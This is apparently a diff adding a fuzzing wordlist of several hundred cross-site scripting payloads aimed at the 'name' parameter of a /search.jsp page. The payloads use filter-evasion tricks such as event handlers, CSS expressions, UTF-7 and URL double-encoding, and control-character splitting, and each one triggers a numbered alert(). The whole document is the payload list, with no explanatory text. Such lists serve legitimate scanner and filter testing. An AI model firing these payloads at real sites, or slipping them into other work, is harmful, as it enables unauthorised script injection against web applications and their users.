+/search.jsp?name=<STYLE>@im\port'\ja\vasc\ript:alert(1041)';</STYLE>
+/search.jsp?name=<IMG STYLE="xss:expr/*XSS*/ession(alert(1042))">
+/search.jsp?name=<XSS STYLE="xss:expression(alert(1043))">
+/search.jsp?name=exp/*<A STYLE='no\xss:noxss("*//*");xss:&#101;x&#x2F;*XSS*//*/*/pression(alert(1044))'>
+/search.jsp?name=<HTML><BODY><?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time"><?import namespace="t" implementation="#default#time2"><t:set attributeName="innerHTML" to="XSS&lt;SCRIPT DEFER&gt;alert(1048)&lt;/SCRIPT&gt;"></BODY></HTML>
+/search.jsp?name=<form id="test" /><button form="test" formaction="javascript:alert(1050)">TESTHTML5FORMACTION
+/search.jsp?name=<form><button formaction="javascript:alert(1051)">crosssitespt
+/search.jsp?name=<frameset onload=alert(1052)>
+/search.jsp?name=<!--<img src="--><img src=x onerror=alert(1053)//">
+/search.jsp?name=<style><img src="</style><img src=x onerror=alert(1054)//">
+/search.jsp?name=<embed src="javascript:alert(1057)">
+/search.jsp?name=<? foo="><script>alert(1058)</script>">
+/search.jsp?name=<! foo="><script>alert(1059)</script>">
+/search.jsp?name=</ foo="><script>alert(1060)</script>">
+/search.jsp?name=<script>ReferenceError.prototype.__defineGetter__('name', function(){alert(1062)}),x</script>
+/search.jsp?name=<script>Object.__noSuchMethod__ = Function,[{}][0].constructor._('alert(1063)')()</script>
+/search.jsp?name=<script src="#">{alert(1064)}</script>;1064
+/search.jsp?name=<script>crypto.generateCRMFRequest('CN=0',0,0,null,'alert(1065)',384,null,'rsa-dual-use')</script>
+/search.jsp?name=<svg xmlns="#"><script>alert(1066)</script></svg>
+/search.jsp?name=<svg onload="javascript:alert(1067)" xmlns="#"></svg>
+/search.jsp?name=<iframe xmlns="#" src="javascript:alert(1068)"></iframe>
+/search.jsp?name=+ADw-script+AD4-alert(1069)+ADw-/script+AD4-
+/search.jsp?name=%2BADw-script+AD4-alert(1070)%2BADw-/script%2BAD4-
+/search.jsp?name=+ACIAPgA8-script+AD4-alert(1071)+ADw-/script+AD4APAAi-
+/search.jsp?name=%253cscript%253ealert(1073)%253c/script%253e
+/search.jsp?name=“><s”%2b”cript>alert(1074)</script>
+/search.jsp?name=“><ScRiPt>alert(1075)</script>
+/search.jsp?name=“><<script>alert(1076);//<</script>
+/search.jsp?name=foo<script>alert(1077)</script>
+/search.jsp?name=<scr<script>ipt>alert(1078)</scr</script>ipt>
+/search.jsp?name=‘; alert(1080); var foo=’
+/search.jsp?name=foo\’; alert(1081);//’;
+/search.jsp?name=</script><script >alert(1082)</script>
+/search.jsp?name=<img src=asdf onerror=alert(1083)>
+/search.jsp?name=<BODY ONLOAD=alert(1084)>
+/search.jsp?name=<script>alert(1085)</script>
+/search.jsp?name="><script>alert(1086))</script>
+/search.jsp?name=<video src=1087 onerror=alert(1087)>
+/search.jsp?name=<audio src=1088 onerror=alert(1088)>
+/search.jsp?name=';alert(1089))//';alert(1089))//";alert(1089))//";alert(1089))//--></SCRIPT>">'><SCRIPT>alert(1089))</SCRIPT>
+/search.jsp?name=0\"autofocus/onfocus=alert(1091)--><video/poster/onerror=prompt(2)>"-confirm(3)-"
+/search.jsp?name=<IMG SRC="javascript:alert(1097);">
+/search.jsp?name=<IMG SRC=javascript:alert(1098)>
+/search.jsp?name=<IMG SRC=JaVaScRiPt:alert(1099)>
+/search.jsp?name=<IMG SRC=javascript:alert(1100)>
+/search.jsp?name=<IMG SRC=`javascript:alert(1101)`>
+/search.jsp?name=<a onmouseover="alert(1102)">xxs link</a>
+/search.jsp?name=<a onmouseover=alert(1103)>xxs link</a>
+/search.jsp?name=<IMG """><SCRIPT>alert(1104)</SCRIPT>">
+/search.jsp?name=<IMG SRC=javascript:alert(1105))>
+/search.jsp?name=<IMG SRC=# onmouseover="alert(1106)">
+/search.jsp?name=<IMG SRC= onmouseover="alert(1107)">
+/search.jsp?name=<IMG onmouseover="alert(1108)">
+/search.jsp?name=<IMG SRC=/ onerror="alert(1109))"></img>
+/search.jsp?name=<IMG SRC="jav	ascript:alert(1115);">
+/search.jsp?name=<IMG SRC="jav&#x09;ascript:alert(1116);">
+/search.jsp?name=<IMG SRC="jav&#x0A;ascript:alert(1117);">
+/search.jsp?name=<IMG SRC="jav&#x0D;ascript:alert(1118);">
+/search.jsp?name=<IMG SRC=" &#14;  javascript:alert(1119);">
+/search.jsp?name=<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert(1121)>
+/search.jsp?name=<<SCRIPT>alert(1123);//<</SCRIPT>
+/search.jsp?name=<IMG SRC="javascript:alert(1126)"
+/search.jsp?name=\";alert(1128);//
+/search.jsp?name=</script><script>alert(1129);</script>
+/search.jsp?name=</TITLE><SCRIPT>alert(1130);</SCRIPT>
+/search.jsp?name=<INPUT TYPE="IMAGE" SRC="javascript:alert(1131);">
+/search.jsp?name=<BODY BACKGROUND="javascript:alert(1132)">
+/search.jsp?name=<IMG DYNSRC="javascript:alert(1133)">
+/search.jsp?name=<IMG LOWSRC="javascript:alert(1134)">
+/search.jsp?name=<STYLE>li {list-style-image: url("javascript:alert(1135)");}</STYLE><UL><LI>XSS</br>
+/search.jsp?name=<BODY ONLOAD=alert(1138)>
+/search.jsp?name=<BGSOUND SRC="javascript:alert(1139);">
+/search.jsp?name=<BR SIZE="&{alert(1140)}">
+/search.jsp?name=<LINK REL="stylesheet" HREF="javascript:alert(1141);">
+/search.jsp?name=<STYLE>@im\port'\ja\vasc\ript:alert(1146)';</STYLE>
+/search.jsp?name=<IMG STYLE="xss:expr/*XSS*/ession(alert(1147))">
+/search.jsp?name=xss:ex/*XSS*//*/*/pression(alert(1149))'>
+/search.jsp?name=<STYLE TYPE="text/javascript">alert(1150);</STYLE>
+/search.jsp?name=<STYLE>.XSS{background-image:url("javascript:alert(1151)");}</STYLE><A CLASS=XSS></A>
+/search.jsp?name=<STYLE type="text/css">BODY{background:url("javascript:alert(1152)")}</STYLE>
+/search.jsp?name=<XSS STYLE="xss:expression(alert(1153))">
+/search.jsp?name=¼script¾alert(1155)¼/script¾
+/search.jsp?name=<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert(1156);">
+/search.jsp?name=<META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:alert(1158);">
+/search.jsp?name=<IFRAME SRC="javascript:alert(1159);"></IFRAME>
+/search.jsp?name=<IFRAME SRC=# onmouseover="alert(1160)"></IFRAME>
+/search.jsp?name=<FRAMESET><FRAME SRC="javascript:alert(1161);"></FRAMESET>
+/search.jsp?name=<TABLE BACKGROUND="javascript:alert(1162)">
+/search.jsp?name=<TABLE><TD BACKGROUND="javascript:alert(1163)">
+/search.jsp?name=<DIV STYLE="background-image: url(javascript:alert(1164))">
+/search.jsp?name=<DIV STYLE="background-image: url(&#1;javascript:alert(1166))">
+/search.jsp?name=<DIV STYLE="width: expression(alert(1167));">
+/search.jsp?name=<!--[if gte IE 4]><SCRIPT>alert(1168);</SCRIPT><![endif]-->
+/search.jsp?name=<BASE HREF="javascript:alert(1169);//">
+/search.jsp?name=<? echo('<SCR)';echo('IPT>alert(1172)</SCRIPT>'); ?>
+/search.jsp?name=<META HTTP-EQUIV="Set-Cookie" Content="USERID=<SCRIPT>alert(1174)</SCRIPT>">
+/search.jsp?name=<HEAD><META HTTP-EQUIV="CONTENT-TYPE" CONTENT="text/html; charset=UTF-7"> </HEAD>+ADw-SCRIPT+AD4-alert(1175);+ADw-/SCRIPT+AD4-
+/search.jsp?name=0\"autofocus/onfocus=alert(1184)--><video/poster/ error=prompt(2)>"-confirm(3)-"
+/search.jsp?name=veris-->group<svg/onload=alert(1185)//
+/search.jsp?name=#"><img src=M onerror=alert(1186);>
+/search.jsp?name=element[attribute='<img src=x onerror=alert(1187);>
+/search.jsp?name=[<blockquote cite="]">[" onmouseover="alert(1188);" ]
+/search.jsp?name=<scr<script>ipt>alert(1195)</scr</script>ipt><scr<script>ipt>alert(1195)</scr</script>ipt>
+/search.jsp?name=<sCR<script>iPt>alert(1196)</SCr</script>IPt>
+/search.jsp?name=%253Cscript%253Ealert(1198)%253C%252Fscript%253E
+/search.jsp?name=<IMG SRC=x onload="alert(1199))">
+/search.jsp?name=<IMG SRC=x onafterprint="alert(1200))">
+/search.jsp?name=<IMG SRC=x onbeforeprint="alert(1201))">
+/search.jsp?name=<IMG SRC=x onbeforeunload="alert(1202))">
+/search.jsp?name=<IMG SRC=x onerror="alert(1203))">
+/search.jsp?name=<IMG SRC=x onhashchange="alert(1204))">
+/search.jsp?name=<IMG SRC=x onload="alert(1205))">
+/search.jsp?name=<IMG SRC=x onmessage="alert(1206))">
+/search.jsp?name=<IMG SRC=x ononline="alert(1207))">
+/search.jsp?name=<IMG SRC=x onoffline="alert(1208))">
+/search.jsp?name=<IMG SRC=x onpagehide="alert(1209))">
+/search.jsp?name=<IMG SRC=x onpageshow="alert(1210))">
+/search.jsp?name=<IMG SRC=x onpopstate="alert(1211))">
+/search.jsp?name=<IMG SRC=x onresize="alert(1212))">
+/search.jsp?name=<IMG SRC=x onstorage="alert(1213))">
+/search.jsp?name=<IMG SRC=x onunload="alert(1214))">
+/search.jsp?name=<IMG SRC=x onblur="alert(1215))">
+/search.jsp?name=<IMG SRC=x onchange="alert(1216))">
+/search.jsp?name=<IMG SRC=x oncontextmenu="alert(1217))">
+/search.jsp?name=<IMG SRC=x oninput="alert(1218))">
+/search.jsp?name=<IMG SRC=x oninvalid="alert(1219))">
+/search.jsp?name=<IMG SRC=x onreset="alert(1220))">
+/search.jsp?name=<IMG SRC=x onsearch="alert(1221))">
+/search.jsp?name=<IMG SRC=x onselect="alert(1222))">
+/search.jsp?name=<IMG SRC=x onsubmit="alert(1223))">
+/search.jsp?name=<IMG SRC=x onkeydown="alert(1224))">
+/search.jsp?name=<IMG SRC=x onkeypress="alert(1225))">
+/search.jsp?name=<IMG SRC=x onkeyup="alert(1226))">
+/search.jsp?name=<IMG SRC=x onclick="alert(1227))">
+/search.jsp?name=<IMG SRC=x ondblclick="alert(1228))">
+/search.jsp?name=<IMG SRC=x onmousedown="alert(1229))">
+/search.jsp?name=<IMG SRC=x onmousemove="alert(1230))">
+/search.jsp?name=<IMG SRC=x onmouseout="alert(1231))">
+/search.jsp?name=<IMG SRC=x onmouseover="alert(1232))">
+/search.jsp?name=<IMG SRC=x onmouseup="alert(1233))">
+/search.jsp?name=<IMG SRC=x onmousewheel="alert(1234))">
+/search.jsp?name=<IMG SRC=x onwheel="alert(1235))">
+/search.jsp?name=<IMG SRC=x ondrag="alert(1236))">
+/search.jsp?name=<IMG SRC=x ondragend="alert(1237))">
+/search.jsp?name=<IMG SRC=x ondragenter="alert(1238))">
+/search.jsp?name=<IMG SRC=x ondragleave="alert(1239))">
+/search.jsp?name=<IMG SRC=x ondragover="alert(1240))">
+/search.jsp?name=<IMG SRC=x ondragstart="alert(1241))">
+/search.jsp?name=<IMG SRC=x ondrop="alert(1242))">
+/search.jsp?name=<IMG SRC=x onscroll="alert(1243))">
+/search.jsp?name=<IMG SRC=x oncopy="alert(1244))">
+/search.jsp?name=<IMG SRC=x oncut="alert(1245))">
+/search.jsp?name=<IMG SRC=x onpaste="alert(1246))">
+/search.jsp?name=<IMG SRC=x onabort="alert(1247))">
+/search.jsp?name=<IMG SRC=x oncanplay="alert(1248))">
+/search.jsp?name=<IMG SRC=x oncanplaythrough="alert(1249))">
+/search.jsp?name=<IMG SRC=x oncuechange="alert(1250))">
+/search.jsp?name=<IMG SRC=x ondurationchange="alert(1251))">
+/search.jsp?name=<IMG SRC=x onemptied="alert(1252))">
+/search.jsp?name=<IMG SRC=x onended="alert(1253))">
+/search.jsp?name=<IMG SRC=x onerror="alert(1254))">
+/search.jsp?name=<IMG SRC=x onloadeddata="alert(1255))">
+/search.jsp?name=<IMG SRC=x onloadedmetadata="alert(1256))">
+/search.jsp?name=<IMG SRC=x onloadstart="alert(1257))">
+/search.jsp?name=<IMG SRC=x onpause="alert(1258))">
+/search.jsp?name=<IMG SRC=x onplay="alert(1259))">
+/search.jsp?name=<IMG SRC=x onplaying="alert(1260))">
+/search.jsp?name=<IMG SRC=x onprogress="alert(1261))">
+/search.jsp?name=<IMG SRC=x onratechange="alert(1262))">
+/search.jsp?name=<IMG SRC=x onseeked="alert(1263))">
+/search.jsp?name=<IMG SRC=x onseeking="alert(1264))">
+/search.jsp?name=<IMG SRC=x onstalled="alert(1265))">
+/search.jsp?name=<IMG SRC=x onsuspend="alert(1266))">
+/search.jsp?name=<IMG SRC=x ontimeupdate="alert(1267))">
+/search.jsp?name=<IMG SRC=x onvolumechange="alert(1268))">
+/search.jsp?name=<IMG SRC=x onwaiting="alert(1269))">
+/search.jsp?name=<IMG SRC=x onshow="alert(1270))">
+/search.jsp?name=<IMG SRC=x ontoggle="alert(1271))">
+/search.jsp?name=<META onpaonpageonpagonpageonpageshowshoweshowshowgeshow="alert(1272)";
+/search.jsp?name=<IMG SRC=x onload="alert(1273))">
+/search.jsp?name=<INPUT TYPE="BUTTON" action="alert(1274)"/>
+/search.jsp?name="><h1><IFRAME SRC="javascript:alert(1275);"></IFRAME>">123</h1>
+/search.jsp?name="><h1><IFRAME SRC=# onmouseover="alert(1276)"></IFRAME>123</h1>
+/search.jsp?name=<IFRAME SRC="javascript:alert(1277);"></IFRAME>
+/search.jsp?name=<IFRAME SRC=# onmouseover="alert(1278)"></IFRAME>
+/search.jsp?name="><h1><IFRAME SRC=# onmouseover="alert(1279)"></IFRAME>123</h1>
+/search.jsp?name="></iframe><script>alert(1280);</script><iframe frameborder="0%EF%BB%BF
+/search.jsp?name="><h1><IFRAME width="420" height="315" SRC="http://www.youtube.com/embed/sxvccpasgTE" frameborder="0" onmouseover="alert(1281)"></IFRAME>123</h1>
+/search.jsp?name=<IFRAME width="420" height="315" frameborder="0" onload="alert(1285)"></IFRAME>
+/search.jsp?name="><h1><IFRAME SRC="javascript:alert(1286);"></IFRAME>">123</h1>
+/search.jsp?name="><h1><IFRAME SRC=# onmouseover="alert(1287)"></IFRAME>123</h1>
+/search.jsp?name=<IFRAME SRC="javascript:alert(1289);"></IFRAME>
+/search.jsp?name=<IFRAME SRC=# onmouseover="alert(1290)"></IFRAME>
+/search.jsp?name=<img src=``&NewLine; onerror=alert(1297)&NewLine;
+/search.jsp?name=<script /**/>/**/alert(1301)/**/</script /**/
+/search.jsp?name=<iframe/src="data:text/html,<svg &#130313031303;&#130313030;load=alert(1303)>">
+/search.jsp?name=<meta content="&NewLine; 1304 &NewLine;; JAVASCRIPT&colon; alert(1304)" http-equiv="refresh"/>
+/search.jsp?name=<form><iframe &#09;&#13110;&#13111311; src="javascript&#58;alert(1311)"&#13111311;&#13110;&#09;;>
+/search.jsp?name=http://www.google<script .com>alert(1313)</script
+/search.jsp?name=<script ^__^>alert(1317))</script ^__^
+/search.jsp?name=</style &#32;><script &#32; :-(>/**/alert(1318)/**/</script &#32; :-(
+/search.jsp?name=&#00;</form><input type&#61319;"date" onfocus="alert(1319)">
+/search.jsp?name=<a href="javascript:void(0)" onmouseover=&NewLine;javascript:alert(1323)&NewLine;>X</a>
+/search.jsp?name=<script ~~~>alert(1324)</script ~~~>
+/search.jsp?name=<iframe// src=javaSCRIPT&colon;alert(1332)
+/search.jsp?name=<%<!--'%><script>alert(1349);</script -->
+/search.jsp?name=<script src="data:text/javascript,alert(1350)"></script>
+/search.jsp?name=<iframe/onreadystatechange=alert(1352)
+/search.jsp?name=<svg/onload=alert(1353)
+/search.jsp?name=<input type="text" value=`` <div/onmouseover='alert(1355)'>X</div>
+/search.jsp?name=http://www.<script>alert(1356)</script .com
+/search.jsp?name=<svg><script ?>alert(1358)
+/search.jsp?name=<img src=`xx:xx`onerror=alert(1360)>
+/search.jsp?name=<meta http-equiv="refresh" content="0;javascript&colon;alert(1362)"/>
+/search.jsp?name=<script>+-+-1372-+-+alert(1372)</script>
+/search.jsp?name=<body/onload=&lt;!--&gt;&#13730alert(1373)>
+/search.jsp?name=<script itworksinallbrowsers>/*<script* */alert(1374)</script
+/search.jsp?name=<img src ?itworksonchrome?\/onerror = alert(1375)
+/search.jsp?name=<svg><script onlypossibleinopera:-)> alert(1377)
+/search.jsp?name=<script x> alert(1379) </script 1379=2
+/search.jsp?name=<div/onmouseover='alert(1380)'> style="x:">
+/search.jsp?name=<--`<img/src=` onerror=alert(1381)> --!>
+/search.jsp?name=<div style="position:absolute;top:0;left:0;width:138300%;height:138300%" onmouseover="prompt(1383)" onclick="alert(1383)">x</button>
+/search.jsp?name=<form><button formaction=javascript&colon;alert(1385)>CLICKME
+/search.jsp?name=<script\x20type="text/javascript">javascript:alert(1390);</script>
+/search.jsp?name=<script\x3Etype="text/javascript">javascript:alert(1391);</script>
+/search.jsp?name=<script\x0Dtype="text/javascript">javascript:alert(1392);</script>
+/search.jsp?name=<script\x09type="text/javascript">javascript:alert(1393);</script>
+/search.jsp?name=<script\x0Ctype="text/javascript">javascript:alert(1394);</script>
+/search.jsp?name=<script\x2Ftype="text/javascript">javascript:alert(1395);</script>
+/search.jsp?name=<script\x0Atype="text/javascript">javascript:alert(1396);</script>
+/search.jsp?name='`"><\x3Cscript>javascript:alert(1397)</script>
+/search.jsp?name='`"><\x00script>javascript:alert(1398)</script>
+/search.jsp?name=<img src=1399 href=1399 onerror="javascript:alert(1399)"></img>
+/search.jsp?name=<audio src=1400 href=1400 onerror="javascript:alert(1400)"></audio>
+/search.jsp?name=<video src=1401 href=1401 onerror="javascript:alert(1401)"></video>
+/search.jsp?name=<body src=1402 href=1402 onerror="javascript:alert(1402)"></body>
+/search.jsp?name=<image src=1403 href=1403 onerror="javascript:alert(1403)"></image>
+/search.jsp?name=<object src=1404 href=1404 onerror="javascript:alert(1404)"></object>
+/search.jsp?name=<script src=1405 href=1405 onerror="javascript:alert(1405)"></script>
+/search.jsp?name=<svg onResize svg onResize="javascript:javascript:alert(1406)"></svg onResize>
+/search.jsp?name=<title onPropertyChange title onPropertyChange="javascript:javascript:alert(1407)"></title onPropertyChange>
+/search.jsp?name=<iframe onLoad iframe onLoad="javascript:javascript:alert(1408)"></iframe onLoad>
+/search.jsp?name=<body onMouseEnter body onMouseEnter="javascript:javascript:alert(1409)"></body onMouseEnter>
+/search.jsp?name=<body onFocus body onFocus="javascript:javascript:alert(1410)"></body onFocus>
+/search.jsp?name=<frameset onScroll frameset onScroll="javascript:javascript:alert(1411)"></frameset onScroll>
+/search.jsp?name=<script onReadyStateChange script onReadyStateChange="javascript:javascript:alert(1412)"></script onReadyStateChange>
+/search.jsp?name=<html onMouseUp html onMouseUp="javascript:javascript:alert(1413)"></html onMouseUp>
+/search.jsp?name=<body onPropertyChange body onPropertyChange="javascript:javascript:alert(1414)"></body onPropertyChange>
+/search.jsp?name=<svg onLoad svg onLoad="javascript:javascript:alert(1415)"></svg onLoad>
+/search.jsp?name=<body onPageHide body onPageHide="javascript:javascript:alert(1416)"></body onPageHide>
+/search.jsp?name=<body onMouseOver body onMouseOver="javascript:javascript:alert(1417)"></body onMouseOver>
+/search.jsp?name=<body onUnload body onUnload="javascript:javascript:alert(1418)"></body onUnload>
+/search.jsp?name=<body onLoad body onLoad="javascript:javascript:alert(1419)"></body onLoad>
+/search.jsp?name=<bgsound onPropertyChange bgsound onPropertyChange="javascript:javascript:alert(1420)"></bgsound onPropertyChange>
+/search.jsp?name=<html onMouseLeave html onMouseLeave="javascript:javascript:alert(1421)"></html onMouseLeave>
+/search.jsp?name=<html onMouseWheel html onMouseWheel="javascript:javascript:alert(1422)"></html onMouseWheel>
+/search.jsp?name=<style onLoad style onLoad="javascript:javascript:alert(1423)"></style onLoad>
+/search.jsp?name=<iframe onReadyStateChange iframe onReadyStateChange="javascript:javascript:alert(1424)"></iframe onReadyStateChange>
+/search.jsp?name=<body onPageShow body onPageShow="javascript:javascript:alert(1425)"></body onPageShow>
+/search.jsp?name=<style onReadyStateChange style onReadyStateChange="javascript:javascript:alert(1426)"></style onReadyStateChange>
+/search.jsp?name=<frameset onFocus frameset onFocus="javascript:javascript:alert(1427)"></frameset onFocus>
+/search.jsp?name=<applet onError applet onError="javascript:javascript:alert(1428)"></applet onError>
+/search.jsp?name=<marquee onStart marquee onStart="javascript:javascript:alert(1429)"></marquee onStart>
+/search.jsp?name=<script onLoad script onLoad="javascript:javascript:alert(1430)"></script onLoad>
+/search.jsp?name=<html onMouseOver html onMouseOver="javascript:javascript:alert(1431)"></html onMouseOver>
+/search.jsp?name=<html onMouseEnter html onMouseEnter="javascript:parent.javascript:alert(1432)"></html onMouseEnter>
+/search.jsp?name=<body onBeforeUnload body onBeforeUnload="javascript:javascript:alert(1433)"></body onBeforeUnload>
+/search.jsp?name=<html onMouseDown html onMouseDown="javascript:javascript:alert(1434)"></html onMouseDown>
+/search.jsp?name=<marquee onScroll marquee onScroll="javascript:javascript:alert(1435)"></marquee onScroll>
+/search.jsp?name=<xml onPropertyChange xml onPropertyChange="javascript:javascript:alert(1436)"></xml onPropertyChange>
+/search.jsp?name=<frameset onBlur frameset onBlur="javascript:javascript:alert(1437)"></frameset onBlur>
+/search.jsp?name=<applet onReadyStateChange applet onReadyStateChange="javascript:javascript:alert(1438)"></applet onReadyStateChange>
+/search.jsp?name=<svg onUnload svg onUnload="javascript:javascript:alert(1439)"></svg onUnload>
+/search.jsp?name=<html onMouseOut html onMouseOut="javascript:javascript:alert(1440)"></html onMouseOut>
+/search.jsp?name=<body onMouseMove body onMouseMove="javascript:javascript:alert(1441)"></body onMouseMove>
+/search.jsp?name=<body onResize body onResize="javascript:javascript:alert(1442)"></body onResize>
+/search.jsp?name=<object onError object onError="javascript:javascript:alert(1443)"></object onError>
+/search.jsp?name=<body onPopState body onPopState="javascript:javascript:alert(1444)"></body onPopState>
+/search.jsp?name=<html onMouseMove html onMouseMove="javascript:javascript:alert(1445)"></html onMouseMove>
+/search.jsp?name=<applet onreadystatechange applet onreadystatechange="javascript:javascript:alert(1446)"></applet onreadystatechange>
+/search.jsp?name=<body onpagehide body onpagehide="javascript:javascript:alert(1447)"></body onpagehide>
+/search.jsp?name=<svg onunload svg onunload="javascript:javascript:alert(1448)"></svg onunload>
+/search.jsp?name=<applet onerror applet onerror="javascript:javascript:alert(1449)"></applet onerror>
+/search.jsp?name=<body onkeyup body onkeyup="javascript:javascript:alert(1450)"></body onkeyup>
+/search.jsp?name=<body onunload body onunload="javascript:javascript:alert(1451)"></body onunload>
+/search.jsp?name=<iframe onload iframe onload="javascript:javascript:alert(1452)"></iframe onload>
+/search.jsp?name=<body onload body onload="javascript:javascript:alert(1453)"></body onload>
+/search.jsp?name=<html onmouseover html onmouseover="javascript:javascript:alert(1454)"></html onmouseover>
+/search.jsp?name=<object onbeforeload object onbeforeload="javascript:javascript:alert(1455)"></object onbeforeload>
+/search.jsp?name=<body onbeforeunload body onbeforeunload="javascript:javascript:alert(1456)"></body onbeforeunload>
+/search.jsp?name=<body onfocus body onfocus="javascript:javascript:alert(1457)"></body onfocus>
+/search.jsp?name=<body onkeydown body onkeydown="javascript:javascript:alert(1458)"></body onkeydown>
+/search.jsp?name=<iframe onbeforeload iframe onbeforeload="javascript:javascript:alert(1459)"></iframe onbeforeload>
+/search.jsp?name=<iframe src iframe src="javascript:javascript:alert(1460)"></iframe src>
+/search.jsp?name=<svg onload svg onload="javascript:javascript:alert(1461)"></svg onload>
+/search.jsp?name=<html onmousemove html onmousemove="javascript:javascript:alert(1462)"></html onmousemove>
+/search.jsp?name=<body onblur body onblur="javascript:javascript:alert(1463)"></body onblur>
+/search.jsp?name=\x3Cscript>javascript:alert(1464)</script>
+/search.jsp?name='"`><script>/* *\x2Fjavascript:alert(1465)// */</script>
+/search.jsp?name=<script>javascript:alert(1466)</script\x0D
+/search.jsp?name=<script>javascript:alert(1467)</script\x0A
+/search.jsp?name=<script>javascript:alert(1468)</script\x0B
+/search.jsp?name=<script charset="\x22>javascript:alert(1469)</script>
+/search.jsp?name=<!--\x3E<img src=xxx:x onerror=javascript:alert(1470)> -->
+/search.jsp?name=--><!-- ---> <img src=xxx:x onerror=javascript:alert(1471)> -->
+/search.jsp?name=--><!-- --\x00> <img src=xxx:x onerror=javascript:alert(1472)> -->
+/search.jsp?name=--><!-- --\x21473> <img src=xxx:x onerror=javascript:alert(1473)> -->
+/search.jsp?name=--><!-- --\x3E> <img src=xxx:x onerror=javascript:alert(1474)> -->
+/search.jsp?name=`"'><img src='#\x27 onerror=javascript:alert(1475)>
+/search.jsp?name=<a href="javascript\x3Ajavascript:alert(1476)" id="fuzzelement1476">test</a>
+/search.jsp?name="'`><p><svg><script>a='hello\x27;javascript:alert(1477)//';</script></p>
+/search.jsp?name=<a href="javas\x00cript:javascript:alert(1478)" id="fuzzelement1478">test</a>
+/search.jsp?name=<a href="javas\x07cript:javascript:alert(1479)" id="fuzzelement1479">test</a>
+/search.jsp?name=<a href="javas\x0Dcript:javascript:alert(1480)" id="fuzzelement1480">test</a>
+/search.jsp?name=<a href="javas\x0Acript:javascript:alert(1481)" id="fuzzelement1481">test</a>
+/search.jsp?name=<a href="javas\x08cript:javascript:alert(1482)" id="fuzzelement1482">test</a>
+/search.jsp?name=<a href="javas\x02cript:javascript:alert(1483)" id="fuzzelement1483">test</a>
+/search.jsp?name=<a href="javas\x03cript:javascript:alert(1484)" id="fuzzelement1484">test</a>
+/search.jsp?name=<a href="javas\x04cript:javascript:alert(1485)" id="fuzzelement1485">test</a>
+/search.jsp?name=<a href="javas\x01486cript:javascript:alert(1486)" id="fuzzelement1486">test</a>
+/search.jsp?name=<a href="javas\x05cript:javascript:alert(1487)" id="fuzzelement1487">test</a>
+/search.jsp?name=<a href="javas\x0Bcript:javascript:alert(1488)" id="fuzzelement1488">test</a>
+/search.jsp?name=<a href="javas\x09cript:javascript:alert(1489)" id="fuzzelement1489">test</a>
+/search.jsp?name=<a href="javas\x06cript:javascript:alert(1490)" id="fuzzelement1490">test</a>
+/search.jsp?name=<a href="javas\x0Ccript:javascript:alert(1491)" id="fuzzelement1491">test</a>
+/search.jsp?name=<script>/* *\x2A/javascript:alert(1492)// */</script>
+/search.jsp?name=<script>/* *\x00/javascript:alert(1493)// */</script>
+/search.jsp?name=<style></style\x3E<img src="about:blank" onerror=javascript:alert(1494)//></style>
+/search.jsp?name=<style></style\x0D<img src="about:blank" onerror=javascript:alert(1495)//></style>
+/search.jsp?name=<style></style\x09<img src="about:blank" onerror=javascript:alert(1496)//></style>
+/search.jsp?name=<style></style\x20<img src="about:blank" onerror=javascript:alert(1497)//></style>
+/search.jsp?name=<style></style\x0A<img src="about:blank" onerror=javascript:alert(1498)//></style>
+/search.jsp?name="'`>ABC<div style="font-family:'foo'\x7Dx:expression(javascript:alert(1499);/*';">DEF
+/search.jsp?name="'`>ABC<div style="font-family:'foo'\x3Bx:expression(javascript:alert(1500);/*';">DEF
+/search.jsp?name=<script>if("x\\xE1501\x96\x89".length==2) { javascript:alert(1501);}</script>
+/search.jsp?name=<script>if("x\\xE0\xB9\x92".length==2) { javascript:alert(1502);}</script>
+/search.jsp?name=<script>if("x\\xEE\xA9\x93".length==2) { javascript:alert(1503);}</script>
+/search.jsp?name='`"><\x3Cscript>javascript:alert(1504)</script>
+/search.jsp?name='`"><\x00script>javascript:alert(1505)</script>
+/search.jsp?name="'`><\x3Cimg src=xxx:x onerror=javascript:alert(1506)>
+/search.jsp?name="'`><\x00img src=xxx:x onerror=javascript:alert(1507)>
+/search.jsp?name=<script src="data:text/plain\x2Cjavascript:alert(1508)"></script>
+/search.jsp?name=<script src="data:\xD4\x8F,javascript:alert(1509)"></script>
+/search.jsp?name=<script src="data:\xE0\xA4\x98,javascript:alert(1510)"></script>
+/search.jsp?name=<script src="data:\xCB\x8F,javascript:alert(1511)"></script>
+/search.jsp?name=<script\x20type="text/javascript">javascript:alert(1512);</script>
+/search.jsp?name=<script\x3Etype="text/javascript">javascript:alert(1513);</script>
+/search.jsp?name=<script\x0Dtype="text/javascript">javascript:alert(1514);</script>
+/search.jsp?name=<script\x09type="text/javascript">javascript:alert(1515);</script>
+/search.jsp?name=<script\x0Ctype="text/javascript">javascript:alert(1516);</script>
+/search.jsp?name=<script\x2Ftype="text/javascript">javascript:alert(1517);</script>
+/search.jsp?name=<script\x0Atype="text/javascript">javascript:alert(1518);</script>
+/search.jsp?name=ABC<div style="x\x3Aexpression(javascript:alert(1519)">DEF
+/search.jsp?name=ABC<div style="x:expression\x5C(javascript:alert(1520)">DEF
+/search.jsp?name=ABC<div style="x:expression\x00(javascript:alert(1521)">DEF
+/search.jsp?name=ABC<div style="x:exp\x00ression(javascript:alert(1522)">DEF
+/search.jsp?name=ABC<div style="x:exp\x5Cression(javascript:alert(1523)">DEF
+/search.jsp?name=ABC<div style="x:\x0Aexpression(javascript:alert(1524)">DEF
+/search.jsp?name=ABC<div style="x:\x09expression(javascript:alert(1525)">DEF
+/search.jsp?name=ABC<div style="x:\xE3\x80\x80expression(javascript:alert(1526)">DEF
+/search.jsp?name=ABC<div style="x:\xE2\x80\x84expression(javascript:alert(1527)">DEF
+/search.jsp?name=ABC<div style="x:\xC2\xA0expression(javascript:alert(1528)">DEF
+/search.jsp?name=ABC<div style="x:\xE2\x80\x80expression(javascript:alert(1529)">DEF
+/search.jsp?name=ABC<div style="x:\xE2\x80\x8Aexpression(javascript:alert(1530)">DEF
+/search.jsp?name=ABC<div style="x:\x0Dexpression(javascript:alert(1531)">DEF
+/search.jsp?name=ABC<div style="x:\x0Cexpression(javascript:alert(1532)">DEF
+/search.jsp?name=ABC<div style="x:\xE2\x80\x87expression(javascript:alert(1533)">DEF
